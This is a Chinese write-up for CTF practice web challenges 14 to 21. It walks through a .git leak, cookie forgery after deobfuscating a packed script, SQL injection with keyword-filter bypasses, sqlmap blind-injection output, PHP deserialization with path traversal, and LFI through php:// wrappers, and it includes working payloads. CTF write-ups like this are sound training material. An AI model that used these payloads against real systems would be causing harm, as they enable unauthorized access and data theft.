---
title: CTF论剑场 Web14-21 WriteUp
tags:
  - Writeup
  - CTF
date: 2019-04-25 20:59:00
---

> 文章首发于安恒网络空间安全讲武堂

<!--more-->

##  web14 GitHack

> hint：听说备份了不少东西呢

![](/assets/images/move/1552754298863-5b7fc7f5-8072-4fc4-9eb0-fb82a532cfcc.png)

根据hint信息可以猜测为`/.git/`敏感文件泄露，该目录下包含了所有 git 正常工作所需要的信息。

使用`GitHack`工具(项目地址:https://github.com/lijiejie/GitHack)进行探测:

![](/assets/images/move/1552754784498-5dcb848e-0743-4fab-b0bc-4e6112fab031.png)



##  web15 vim



hint: vim编辑器



![](/assets/images/move/1552790422604-d6e12a34-3495-457e-b8f1-95a6b22ffcfc.png)



尝试提交`id`参数为swp，回显：**不是这里不是这里不是这里!!!**。

注意到此时的链接为`/1ndex.php?id=swp&submit=提交查询#`，尝试修改**1**为**i**并提交访问，得到flag{Is_wh1te_ooo000oo0}。

## web16 江湖

学会如来神掌应该就能打败他了吧

![](/assets/images/move/1552790728537-029e66ca-6aa9-4b54-9747-f9819852ab3a.png)



进入江湖：



![](/assets/images/move/1552790783917-2333e15d-e11a-46f1-9daa-f88704e9756e.png)



点击**刷新属性**会刷新各属性的值，动态变化，点击**确定**进入：



![](/assets/images/move/1552790940944-c06d9bdb-818b-47db-bb9d-a63fcb76ed06.png)

- 属性中提示：每次练功和赚钱都会消耗5秒的时间,请您耐心等待。
- 每次练功会增加一定的属性提升，耗时5s一次。
- 商店中提示：必须将血量、内力、力道、定力修炼到满才可以学习如来神掌。
- 点击赚钱每次会增加100银两的收入。



结合**学会如来神掌应该就能打败他了吧**，推测思路为学会如来神掌后讨伐魔头，因此我们需要通过提升各属性值为满且从商店购买**如来神掌**。

![](/assets/images/move/1552835608314-5110a4c1-5057-442b-9f26-e387283b526b.png)



方案:拥有足够的银两即可提升属性值为满且学习如来神掌。

F12查看页面源代码发现有以下`js`脚本文件:

![](/assets/images/move/1552921173877-e5eaaf8e-7454-41cf-9f50-da27a09fb236.png)

另外**Cookie**如下:

![](/assets/images/move/1552792292999-c0c20899-fc49-467e-8a02-db9d29cceaf1.png)



下载script.js审计，这里使用VSCode进行查看（Windows下Shift + Alt + F进行代码格式化整理):

```js
eval(function (p, a, c, k, e, r) {
    e = function (c) { return (c < 62 ? '' : e(parseInt(c / 62))) + ((c = c % 62) > 35 ? String.fromCharCode(c + 29) : c.toString(36)) };
    if ('0'.replace(0, e) == 0) {
        while (c--) r[e(c)] = k[c];
        k = [function (e) { return r[e] || e }];
        e = function () {
            return '[57-9abd-hj-zAB]'
        };
        c = 1
    };
    while (c--) if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]); return p
}('7 s(t){5 m=t+"=";5 8=9.cookie.n(\';\');o(5 i=0;i<8.d;i++){5 c=8[i].trim();u(c.v(m)==0)p c.substring(m.d,c.d)}p""}7 w(a){5 x=new Base64();5 q=x.decode(a);5 r="";o(i=0;i<q.d;i++){5 b=q[i].charCodeAt();b=b^i;b=b-((i%10)+2);r+=String.fromCharCode(b)}p r}7 ertqwe(){5 y="user";5 a=s(y);a=decodeURIComponent(a);5 z=w(a);5 8=z.n(\';\');5 e="";o(i=0;i<8.d;i++){u(-1<8[i].v("A")){e=8[i+1].n(":")[2]\}\}e=e.B(\'"\',"").B(\'"\',"");9.write(\'<img id="f-1" g="h/1-1.k">\');j(7(){9.l("f-1").g="h/1-2.k"},1000);j(7(){9.l("f-1").g="h/1-3.k"},2000);j(7(){9.l("f-1").g="h/1-4.k"},3000);j(7(){9.l("f-1").g="h/6.png"},4000);j(7(){alert("你使用如来神掌打败了蒙老魔，但不知道是真身还是假身，提交试一下吧!A{"+md5(e)+"}")},5000)}', [], 38, '|||||var||function|ca|document|temp|num||length|key|attack|src|image||setTimeout|jpg|getElementById|name|split|for|return|result|result3|getCookie|cname|if|indexOf|decode_create|base|temp_name|mingwen|flag|replace'.split('|'), 0, {}))
```

发现代码进行了`packer`打包，直接在线解混后淆得到:

```js
function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i].trim();
        if (c.indexOf(name) == 0) return c.substring(name.length, c.length)
    }
    return ""
}

function decode_create(temp) {
    var base = new Base64();
    var result = base.decode(temp);
    var result3 = "";
    for (i = 0; i < result.length; i++) {
        var num = result[i].charCodeAt();
        num = num ^ i;
        num = num - ((i % 10) + 2);
        result3 += String.fromCharCode(num)
    }
    return result3
}

function ertqwe() {
    var temp_name = "user";
    var temp = getCookie(temp_name);
    temp = decodeURIComponent(temp);
    var mingwen = decode_create(temp);
    var ca = mingwen.split(';');
    var key = "";
    for (i = 0; i < ca.length; i++) {
        if (-1 < ca[i].indexOf("flag")) {
            key = ca[i + 1].split(":")[2]
        }
    }
    key = key.replace('"', "").replace('"', "");
    document.write('<img id="attack-1" src="image/1-1.jpg">');
    setTimeout(function() {
        document.getElementById("attack-1").src = "image/1-2.jpg"
    }, 1000);
    setTimeout(function() {
        document.getElementById("attack-1").src = "image/1-3.jpg"
    }, 2000);
    setTimeout(function() {
        document.getElementById("attack-1").src = "image/1-4.jpg"
    }, 3000);
    setTimeout(function() {
        document.getElementById("attack-1").src = "image/6.png"
    }, 4000);
    setTimeout(function() {
        alert("你使用如来神掌打败了蒙老魔，但不知道是真身还是假身，提交试一下吧!flag{" + md5(key) + "}")
    }, 5000)
}
```

控制台执行如下命令：

![](/assets/images/move/1552796073423-ec88efa7-4f18-4e54-a926-8d8a6d0344f5.png)

尝试修改各属性值money为1000000并加密，PHP脚本如下（这里感谢[淚笑](https://www.cnblogs.com/leixiao)师傅的指导~自写的python脚本存在一些问题结果不一致~）：

```php
<?php
function encode($payload) {
	$result = '';
    for($i = 0; $i < strlen($payload); $i++) {
    	$b = ord($payload[$i]);
        $b = $b + (($i % 10) + 2);
        $b = $b ^ $i;
        $result = $result.chr($b);
	}
	return $result;
}

$payload = 'O:5:"human":10:{s:8:"xueliang";i:12;s:5:"neili";i:856;s:5:"lidao";i:83;s:6:"dingli";i:92;s:7:"waigong";i:0;s:7:"neigong";i:0;s:7:"jingyan";i:0;s:6:"yelian";i:0;s:5:"money";i:1000000;s:4:"flag";s:1:"1";}';

echo base64_encode(encode($payload));

//UTw7PCxqe3FjcC42OThOjWtSUFYwbm99amlzbG0wI3MeFxphX2YZYgxYQ0VeXQRrQ3QICw51T3YFehZMV1pbS2gDMwAGe3sxdnIKYiA/Nj0+PXQTOxQXbB0nZmFieiM3EREbGg1AWQkoXikXKC9SSgIbHR0DAgdaRRVETj0HPD/ErO7v9un57/6iz/+wvrH30KzQuBfl+Pv96rLZ7d6k2dWcm5yM0dHQxy2OlcGSmZiIiIiIhovBiIL4kNTK0dea/7mC+4bu/er1SQ==
//encodeURIComponent->UTw7PCxqe3FjcC42OThOjWtSUFYwbm99amlzbG0wI3MeFxphX2YZYgxYQ0VeXQRrQ3QICw51T3YFehZMV1pbS2gDMwAGe3sxdnIKYiA%2FNj0%2BPXQTOxQXbB0nZmFieiM3EREbGg1AWQkoXikXKC9SSgIbHR0DAgdaRRVETj0HPD%2FErO7v9un57%2F6iz%2F%2BwvrH30KzQuBfl%2BPv96rLZ7d6k2dWcm5yM0dHQxy2OlcGSmZiIiIiIhovBiIL4kNTK0dea%2F7mC%2B4bu%2Fer1SQ%3D%3D
?>
```

将修改后的cookie字段发包:

![](/assets/images/move/1552837997497-7add57ed-7416-4ed9-9e26-c2197e7d5236.png)



提升属性和学习如来神掌后讨伐老魔获取flag：

![](/assets/images/move/1552838417921-5e63eaa8-5358-4ed7-ba4f-e1fc6fbf0753.png)



另外在`/wulin.php`下发现了出题人留下的彩蛋，可以检测flag的正确性：

![](/assets/images/move/1552838560315-2e7a313f-0861-49fd-bba7-4e4b9fb4f662.png)

## web17 流量分析

直接使用Wireshark打开bugku.pcapng进行TCP流追踪即可找到flag。

![](/assets/images/move/1552920480203-0dd89ae0-39fa-45c5-b3a2-1f569d42bbb0.png)





## web18 Sql injection

![](/assets/images/move/1552883028265-5171c1ed-f4c3-474c-b100-cb08239d803d.png)

![](/assets/images/move/1552882900403-54768523-ac70-43d2-98cf-edeba4bd50e2.png)



试探过程如下：

```sql
?id=1'  回显空白 -> 可能为单引号闭合
?id=1'--+ 回显正常 -> 单引号闭合方式
?id=1' and 1=1--+ 回显空白 -> 可能过滤了and
?id=1' And 1=1--+ 回显空白 -> 可能过滤了大小写
?id=1' anandd 1=1--+ 回显正常 -> 嵌套剥离绕过 过滤了and、or
?id=1' oorrder by 3--+ ->列数为3
```

爆数据库：

```sql
?id=-1' uniunionon selselectect 1,group_concat(schema_name),3 from infoorrmation_schema.schemata--+
```

得到:information_schema,web18.

爆表：

```sql
?id=-1' uniunionon selselectect 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema='web18'--+
```

得到: ctf,flag.

爆列：

```sql
?id=-1' uniunionon selselectect 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_name='flag'--+
```

得到：id,flag.

爆字段：

```sql
?id=-1' uniunionon selselectect 1,flag,3 from flag--+
```

获取flag{22b7a7c3d73d88050722b3eeb102ee45} . 

   

## web19 Poc And Exp&#39;s Love Note

![](/assets/images/move/1552903244586-895c66f6-aa11-4ac5-96a8-f36f409d5a00.png)

`dirsearch`探测下发现存在`/.git/`泄露:

![](/assets/images/move/1552903604902-d4b85ef9-98bc-4af8-9eea-c27af92f99a7.png)

`Githack`操作一下，在flag.txt中获取Hint 1: flag is in /eXpl0ve5p0cVeRymuCh。

![](/assets/images/move/1552904156016-c2065fec-a46e-4b57-a6d7-2f8ad930c581.png)

`sqlmap`跑一下，发现存在基于时间的布尔盲注：

```bash
---
Parameter: username (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: username=admin' AND SLEEP(5) AND 'JKEb'='JKEb&password=123
    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
---
```

继续获取信息:

```bash
available databases [2]:
[*] information_schema
[*] web19
In Database: web19
[2 tables]
+--------+
| user   |
| hlnt_2 |
+--------+
Database: web19
Table: user
[1 entry]
+----+----------+----------------+
| id | username | password       |
+----+----------+----------------+
| 1  | admin    | p0CLOvesExpT00 |
+----+----------+----------------+
Database: web19
Table: hlnt_2
[1 entry]
+----+-----------------------------------------------+
| id | hInt                                          |
+----+-----------------------------------------------+
| 1  | a class for you "https://postimg.cc/6274vCP5" |
+----+-----------------------------------------------+
```

用获取到的username和password登录admin账户:

![](/assets/images/move/1552906316323-20c7f067-90a1-4930-8a98-75b8e30c7961.png)

查看页面源代码发现有注释掉的内容:

![](/assets/images/move/1552906718771-46c85a2b-20e2-45f2-8678-c81717c7f3dd.png)

结合**游记内容**推测可能为[snow](http://www.darkside.com.au/snow/) HTML隐写（可以在ASCII文本的末行隐藏数据，并且可以通过插入制表位和空格使嵌入的数据在浏览器中不可见），使用BurpSuite抓取该页面内容保存至1.html（尝试从Firefox保存分析存在问题，感谢冷暗雨师傅指导~）.

![](/assets/images/move/1552913911594-9c6dbd08-074b-428d-890f-e8dcc429953d.png)

```bash
C:\Users\light\Desktop>SNOW.EXE -C -p ILOveExp 1.html
flag in /PPPPOOO0CCCC.php
```

结合在hlnt_2表中获取的Hint2:`a class for you "https://postimg.cc/6274vCP5"`。

![](/assets/images/move/1552905948498-139225fc-192b-4729-bf3e-789167cb6a2b.png)

Payload：

```php
<?php
class ReadFile {
	public $file;
}

$payload = new ReadFile();
$payload->file = '../../PPPPOOO0CCCC.php';
echo serialize($payload);

//O:8:"ReadFile":1:{s:4:"file";s:22:"../../PPPPOOO0CCCC.php";}
//encodeURIComponent
//O%3A8%3A%22ReadFile%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A22%3A%22..%2F..%2FPPPPOOO0CCCC.php%22%3B%7D
```

![](/assets/images/move/1552915162974-b150a5ab-0959-403f-b80e-ea36a748debb.png)

## web20  GET_key

你的动态密文是：fb49037b2bb5315bdad5228d7cf0c34e2
GET提交对应的密文可以得到flag(form_input_name='key')
输出格式：'flag{....}'

Python脚本：

```python
import re
import requests

url = 'http://123.206.31.85:10020/'
r = requests.session()
text = r.get(url).text
key = re.findall(r'[0-9a-z]+', text)[0]
url2 = url + '?key=' + key
text2 = r.get(url2).text
print(text2)
```

多试几次，正确提交后有一定几率会获取flag{Md5tiMe8888882019}~



## web21 LFI

打开网页显示：

you are not admin !

F12查看发现注释掉的PHP代码：

```php
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];
 
if(isset($user)&&(file_get_contents($user,'r')==="admin")){
    echo "hello admin!<br>";
    include($file); //class.php
}else{
    echo "you are not admin ! ";
}
```

看到`file_get_contents()`函数推测可能存在文件包含(参看[LFI（Local File Include）漏洞](https://github.com/SewellDinG/LFIboomCTF)学习)，利用姿势如下:

- 利用`php://input`和POST发包`admin`绕过file_get_contents($user,'r')==="admin")。
- 利用`php://filter/read=convert.base64-encode/resource=class.php`来读取class.php。

```html
/index.php?user=php://input&file=php://filter/read=convert.base64-encode/resource=class.php
```

得到回显:

```html
hello admin!
PD9waHANCmVycm9yX3JlcG9ydGluZyhFX0FMTCAmIH5FX05PVElDRSk7DQogDQpjbGFzcyBSZWFkey8vZjFhOS5waHANCiAgICBwdWJsaWMgJGZpbGU7DQogICAgcHVibGljIGZ1bmN0aW9uIF9fdG9TdHJpbmcoKXsNCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsNCiAgICAgICAgICAgIGVjaG8gZmlsZV9nZXRfY29udGVudHMoJHRoaXMtPmZpbGUpOyAgICANCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gIl9fdG9TdHJpbmcgd2FzIGNhbGxlZCEiOw0KICAgIH0NCn0NCj8+
```

解Base64得到class.php：

```php
<?php
error_reporting(E_ALL & ~E_NOTICE);
 
class Read{//f1a9.php
    public $file;
    public function __toString(){
        if(isset($this->file)){
            echo file_get_contents($this->file);    
        }
        return "__toString was called!";
    }
}
?>
```

注意到`__toString()`函数执行时会读取并打印`$this->file`的内容，构造序列化脚本：

```php
<?php
class Read{
	public $file;
}

$payload = new Read();
$payload->file = 'f1a9.php';
echo serialize($payload);
//O:4:"Read":1:{s:4:"file";s:8:"f1a9.php";}
```

赋值给`pass`，当作为字符串是将调用**__toString()**读取f1a9.php的内容，Payload：

```html
/index.php?user=php://input&file=class.php&pass=O:4:"Read":1:{s:4:"file";s:8:"f1a9.php";}
```

![](/assets/images/move/1552917136762-f843082b-862d-43c1-880c-5c0230ef6e27.png)